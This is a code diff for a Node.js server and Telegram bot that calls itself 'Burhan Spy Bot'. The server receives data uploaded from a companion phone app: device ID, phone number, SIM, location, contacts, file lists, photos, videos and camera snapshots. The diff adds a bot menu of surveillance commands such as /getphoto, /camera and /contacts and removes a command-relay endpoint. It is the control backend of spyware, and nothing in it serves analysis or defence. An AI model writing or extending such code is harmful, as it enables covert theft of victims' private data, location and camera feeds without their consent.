@@ -22,7 +22,7 @@ function saveDevices() {
     fs.writeFileSync(dataFile, JSON.stringify(devices, null, 2));
 }
 
-// ✅ 1. Chhota Data (Device ID, Battery, Location, etc.) Save Karo
+// ✅ App ko Device Register karne do
 app.post('/api/register-device', (req, res) => {
     const { deviceId, deviceName, phoneNumber, battery, ip, sim, online, time } = req.body;
     devices[deviceId] = { 
@@ -39,7 +39,7 @@ app.post('/api/register-device', (req, res) => {
     res.json({ success: true });
 });
 
-// ✅ 2. Chhota Data (Contacts, Location, Files List) Bot ko bhejo
+// ✅ App se data receive karo
 app.post('/api/upload-data', (req, res) => {
     const { deviceId, type, data } = req.body;
     
@@ -55,7 +55,7 @@ app.post('/api/upload-data', (req, res) => {
     res.json({ success: true });
 });
 
-// ✅ 3. Bada Data (Photo, Video, Snapshot) Stream karo + Auto-Delete
+// ✅ App se Bada Data (Photo, Video, Snapshot) receive karo
 app.post('/api/stream-data', (req, res) => {
     const { deviceId, type, filePath } = req.body;
     
@@ -79,23 +79,22 @@ app.post('/api/stream-data', (req, res) => {
     res.json({ success: true });
 });
 
-// ✅ 4. App ko commands bhejo
-app.post('/api/command', (req, res) => {
-    const { deviceId, command, path } = req.body;
-    // App ko command bhejo
-    axios.post('http://localhost:3000/api/send-command', { deviceId, command, path })
-        .then(() => res.json({ success: true }))
-        .catch(() => res.json({ success: false }));
-});
-
-// ✅ 5. App ko commands bhejo (GET /api/commands?deviceId=...)
+// ✅ App ko commands bhejo (GET /api/commands?deviceId=...)
 app.get('/api/commands', (req, res) => {
     const { deviceId } = req.query;
-    // Yahan command bhejne ka logic
     res.json({ command: 'status' });
 });
 
-// ✅ /devices — Saare devices ki list
+// ✅ Bot ko commands sunna hai
+bot.onText(/\/start/, (msg) => {
+    const chatId = msg.chat.id;
+    if (!isAuthorized(msg)) {
+        bot.sendMessage(chatId, "⛔ Access Denied!");
+        return;
+    }
+    bot.sendMessage(chatId, `🔥 Welcome to Burhan Spy Bot! 🔥\n\n🎯 Owner: Sheikh Burhan\n\n📜 Commands:\n/devices - View all devices\n/files - Scan Files\n/getphoto - Get Photo\n/getvideo - Get Video\n/camera - Camera Snapshot\n/ping - Check device alive\n/stats - Total devices\n/contacts - Fetch contacts\n/help - Commands ka format`);
+});
+
 bot.onText(/\/devices/, (msg) => {
     const chatId = msg.chat.id;
     if (!isAuthorized(msg)) {
